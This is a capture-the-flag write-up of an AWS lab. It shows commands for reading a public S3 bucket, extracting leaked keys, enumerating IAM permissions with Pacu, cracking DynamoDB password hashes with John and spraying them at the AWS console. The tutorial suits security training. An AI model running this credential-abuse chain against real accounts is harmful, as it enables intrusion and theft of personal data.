<img width="1536" height="1024" alt="cover" src="https://github.com/user-attachments/assets/778fe3dc-90aa-4eb4-becf-9009d089a84f" />

hello pwners, today we have a great lab from PWNED LABS: https://app.pwnedlabs.io/labs/execute-and-identify-credential-abuse-in-aws

This lab brings together two critical perspectives in cybersecurity:

- Red Team: How an individual who has obtained AWS credentials can discover the permissions available to them and exploit excessive privileges to access other services and data.
- Blue Team: How to detect account misuse through logs, identify a compromised account, and contain the incident.

## Let’s understand the first scenario.

Imagine a company that uses AWS, with an employee named `'rstead'`. This employee has an IAM account, which allows them to interact with certain company resources.

A security incident occurs: an attacker manages to obtain the credentials for an account within the AWS environment and begins exploring the permissions available to it.

## Attack Chain

Public S3 bucket -> Extracting encrypted passwords -> IAM permissions & DynamoDB -> Credential reuse -> Access to sensitive data

---
# Enumeration

Since the lab provided us with an S3 bucket, it will be our entry point.

<img width="1328" height="551" alt="image" src="https://github.com/user-attachments/assets/de278a41-1772-4bf8-9231-35e35b95fa9d" />

Let's play with it.

First, I will try to list that bucket with no credentials, maybe there are files set to public, who knows?

```bash
aws s3 ls hl-storage-general --no-sign-request
```

<img width="1104" height="63" alt="image" src="https://github.com/user-attachments/assets/3a38f575-c254-401b-ba2f-3ef39a2ef60d" />

As you can see here, this bucket has a folder called `migration`.
Let's see what is inside this folder.

```bash
aws s3 ls hl-storage-general/migration/ --no-sign-request
```

<img width="1268" height="89" alt="image" src="https://github.com/user-attachments/assets/3240efe7-7244-4798-b5dc-85d9e2f15b94" />

As you can see, that folder contains a file named `asana-cloud-migration-backup.json`.

## What is Asana?

Teams use Asana, a cloud-based platform, to keep their tasks organized and on track. Just keep in mind that the information inside can be confidential.

Let's download this file and see what it hides.

```bash
aws s3 cp s3://hl-storage-general/migration/asana-cloud-migration-backup.json . --no-sign-request
```

The file is an export of an Asana project, and its `notes` field contains project details along with sensitive data. Keeping secrets inside a project file and then making that file publicly accessible is the first security mistake in the attack chain.

<img width="1919" height="433" alt="image" src="https://github.com/user-attachments/assets/4ae0f31c-593a-4361-ad43-e1b32fd54b8a" />

So let's grep all the `notes` fields.

```bash
cat asana-cloud-migration-backup.json | grep '"notes"'
```

<img width="1224" height="266" alt="image" src="https://github.com/user-attachments/assets/bcc765de-afb1-4467-b5bb-ec50e50b97f1" />

Here we go, bro, I found AWS credentials!

Now let's configure ourselves with the AWS CLI, but before that we need to know the region that the company uses to deploy infrastructure.

We can find this out by sending a HEAD HTTP request to the S3 bucket. The response returns the region in the `x-amz-bucket-region` header.

```bash
curl -I hl-storage-general.s3.amazonaws.com
```

`-i` (or `--include`) tells `curl` to include the HTTP response headers in the output, along with the response body.

<img width="1224" height="266" alt="image" src="https://github.com/user-attachments/assets/55294e5a-702c-4b9d-81a7-d4e3f41e5e63" />

As you can see, the region is `us-east-1`.

Let's now configure:

```bash
aws configure
```

<img width="969" height="119" alt="image" src="https://github.com/user-attachments/assets/dc7724bd-0d4d-4700-8fa0-b24938027ef5" />

Now let's see who we are.

```bash
aws sts get-caller-identity
```

<img width="880" height="132" alt="image" src="https://github.com/user-attachments/assets/da768581-3e40-41b0-9ebc-faa18f3b280c" />

From the output, we can see that we are authenticated as the IAM user `migration-test` in AWS account `243687662613`.

---
# Exploring IAM permissions using `Pacu`

## What is Pacu?

Pacu is an open-source framework for testing the security of AWS environments, and it makes enumerating our permissions much easier.

You can find and install it here: https://github.com/RhinoSecurityLabs/pacu

After installing it, make sure to create a virtual environment to install the requirements.

<img width="911" height="353" alt="image" src="https://github.com/user-attachments/assets/f42a5bd1-5c60-4c3c-b70e-fad0813b677a" />

Let's fire it up!

When it asks you to create a new session, set `0`.

<img width="849" height="774" alt="image" src="https://github.com/user-attachments/assets/fb56e352-faef-4c88-a67e-18708be142f2" />

After that, use `set_keys` to enter the creds that we found.

<img width="989" height="369" alt="image" src="https://github.com/user-attachments/assets/5fa29ab1-4b41-4aa4-88b5-5bace1eb8b21" />

We can list the available modules in Pacu with `ls`.

To understand what we can do, we will use a module called `iam__bruteforce_permissions`.

```
run iam__bruteforce_permissions
```

<img width="1016" height="234" alt="image" src="https://github.com/user-attachments/assets/29ed7d99-d6ea-4a65-88a0-23726dddbe44" />

It finds multiple DynamoDB permissions!

---
# Lateral Movement to DynamoDB

DynamoDB is a fully managed, serverless NoSQL database service from AWS. It stores data as key-value/document items in tables, scales automatically, and delivers fast, low-latency performance even at large scale.

Since we have the permission to list the tables, why not list them?

```bash
aws dynamodb list-tables
```

<img width="855" height="173" alt="image" src="https://github.com/user-attachments/assets/93fc7fa3-3dc5-4c92-9159-667b280c3914" />

We get two tables: `analytics_app_users` and `user_order_logs`.

Let's now see if we can read the two tables. We will use `describe-table` to achieve that.

```bash
aws dynamodb describe-table --table-name analytics_app_users
aws dynamodb describe-table --table-name user_order_logs
```

<img width="1253" height="522" alt="image" src="https://github.com/user-attachments/assets/053b204a-e2b0-47bd-a592-e57a08919677" />

<img width="1916" height="104" alt="image" src="https://github.com/user-attachments/assets/b104a1bb-4cce-484f-841f-75bd2f6c62a6" />

As you can see, we can describe `analytics_app_users` but we can't describe `user_order_logs`.

The success of `ListTables` does not mean that you can read all the data. Each operation has its own independent IAM permissions, and these permissions may vary depending on the specific resource name.

This result is what makes us realize that we need to identify another account or different permissions.

---
# Cracking Hashes

Let's download the table `analytics_app_users` to our machine and see how we can use it.

```bash
aws dynamodb scan --table-name analytics_app_users > output.json
```

<img width="1082" height="551" alt="image" src="https://github.com/user-attachments/assets/b5616046-99a4-4fd2-a339-8beeb953fe59" />

The table contains the username and the password hash for `51` different users.

Let's check the hash type:

```bash
hashid <hash>
```

<img width="1363" height="256" alt="image" src="https://github.com/user-attachments/assets/c421801f-978a-4fde-b3e0-89fcf9efe06c" />

It's `SHA-256`.

Before we start cracking the hashes, we need to put them in a `username:hash` format. This format allows `John` to treat each hash as belonging to a specific user, and it can display the discovered password alongside the corresponding username.

There are many ways to do that, but I will go with Python to make a simple script to handle it, as that's what I know and what I'm good at. I will attach the script with the writeup.

<img width="862" height="621" alt="image" src="https://github.com/user-attachments/assets/6bde1a4e-eec9-45c0-b814-4448f044259b" />

Now we have our credentials ready for cracking!

```bash
john ./user_hash --format=Raw-SHA256 --wordlist=../../Wordlists/rockyou.txt
```

<img width="1421" height="578" alt="image" src="https://github.com/user-attachments/assets/cf02f5b9-71db-4c45-aaa6-c840b41973d5" />

Great, we cracked the hashes and got the passwords for 18 users!

And we can export that list using:

```bash
john ./user_hash --show --format=Raw-SHA256
```

<img width="1174" height="557" alt="image" src="https://github.com/user-attachments/assets/da97c7e7-b2c6-411e-aefc-37eb25edb9ee" />

# Lateral Movement via AWS Console Credential Stuffing

An obvious place to reuse these credentials is the AWS Console. Maybe some of these users have the same username and password for their IAM account?

A good tool to use is [GoAWSConsoleSpray](https://github.com/WhiteOakSecurity/GoAWSConsoleSpray). This script takes an AWS account ID, a user list, and a password list as parameters.

So we need to have two separate lists: one for the `usernames` and one for the `passwords`.

```bash
john ./user_hash --show --format=Raw-SHA256 | awk -F":" '{print $1}' > users.txt

john ./user_hash --show --format=Raw-SHA256 | awk -F":" '{print $2}' > passwords.txt
```

Don't forget to remove the john artifact from the bottom of the user list.

Install GoAWSConsoleSpray:

```bash
go install github.com/WhiteOakSecurity/GoAWSConsoleSpray@latest
```

After installing it, you can find it in `~/go/bin`.

Let's fire it up!!

<img width="1541" height="299" alt="image" src="https://github.com/user-attachments/assets/6c570b75-1609-46a8-980a-4ff9c16fe5f2" />

Here we go, we found a valid password for the user `rstead`, and Multi-Factor Authentication is not enabled for this user.

So let's sign in!

<img width="1236" height="809" alt="image" src="https://github.com/user-attachments/assets/67d8ffd6-d461-4546-a67b-4f72818bc74d" />

And we are in.

<img width="1920" height="988" alt="image" src="https://github.com/user-attachments/assets/3f372a53-bacd-4da0-bead-ff154a46a117" />

If you remember, you found two tables in DynamoDB: one we were able to read, which is `analytics_app_users`, and one we couldn't, which is `user_order_logs`. So let's check if we are now able to access it.

We can do that by navigating to the DynamoDB service.

<img width="1919" height="985" alt="image" src="https://github.com/user-attachments/assets/a11683ca-c2c4-4b09-b1e4-7a36f5054ded" />

Then we will see the table.

<img width="1919" height="988" alt="image" src="https://github.com/user-attachments/assets/2cdb8ea3-8975-4d21-a0e0-4a2f869b8e31" />

Select it and then `Explore items`.

<img width="1919" height="989" alt="image" src="https://github.com/user-attachments/assets/bbd0b2aa-9077-42be-9c28-0da1c26fa4cd" />

And here we go!

<img width="1918" height="980" alt="image" src="https://github.com/user-attachments/assets/d62a35b9-7e0d-4da1-9681-8110a516800e" />

The dataset exposes users’ personally identifiable information (PII). PWNED! The flag is sitting right there in the table too.

I hope you enjoyed it with me. I will keep the red side limited to this writeup, but that doesn't mean there isn't another one, the blue side ;)
